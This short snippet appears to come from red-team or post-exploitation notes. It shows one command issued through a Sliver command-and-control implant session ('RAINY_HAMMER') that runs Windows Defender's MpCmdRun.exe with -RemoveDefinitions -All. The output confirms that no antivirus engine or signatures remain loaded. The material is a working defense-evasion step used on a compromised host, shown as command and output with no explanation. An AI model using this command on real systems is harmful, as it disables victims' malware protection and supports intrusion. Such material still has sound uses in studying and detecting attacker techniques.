

```
execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

```
[server] sliver (RAINY_HAMMER) > execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

[*] Output:

Service Version: 0.0.0.0
Engine Version: 0.0.0.0

No engine/signature is currently loaded.

```